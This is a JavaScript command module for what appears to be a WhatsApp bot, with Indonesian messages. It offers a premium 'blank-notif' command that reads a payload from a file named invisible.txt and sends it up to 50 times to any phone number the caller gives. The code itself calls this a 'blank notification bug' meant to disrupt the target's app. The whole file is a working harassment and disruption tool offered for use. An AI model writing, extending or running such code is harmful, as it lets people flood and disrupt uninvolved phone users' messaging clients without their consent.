const fs = require('fs');
const path = require('path');

module.exports = {
    command: 'blank-notif',
    execute: async (sock, m, { args, reply, isPremium }) => {
        if (!isPremium) return reply("Fitur ini khusus untuk member premium (murbug).");
        
        const nomor = args[0];
        const jumlah = parseInt(args[1]) || 5;
        const INVIS_FILE = './invisible.txt';

        if (!nomor) return reply("Penggunaan: .blank-notif [nomor] [jumlah]\nContoh: .blank-notif 6281234567890 10");
        if (jumlah > 50) return reply("Maksimal 50 pesan sekali kirim.");

        const target = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

        try {
            if (!fs.existsSync(INVIS_FILE)) return reply("File payload invisible.txt tidak ditemukan.");
            
            const payload = fs.readFileSync(INVIS_FILE, 'utf-8');
            const finalChat = '.\n' + payload;

            await reply(`Sending blank notification bug to ${target}...`);

            for (let i = 0; i < jumlah; i++) {
                await sock.sendMessage(target, { text: finalChat }, { quoted: m });
            }

            reply(`Successfully sent blank bug to ${target}`);
        } catch (err) {
            reply("Gagal mengirim bug: " + err.message);
        }
    }
};
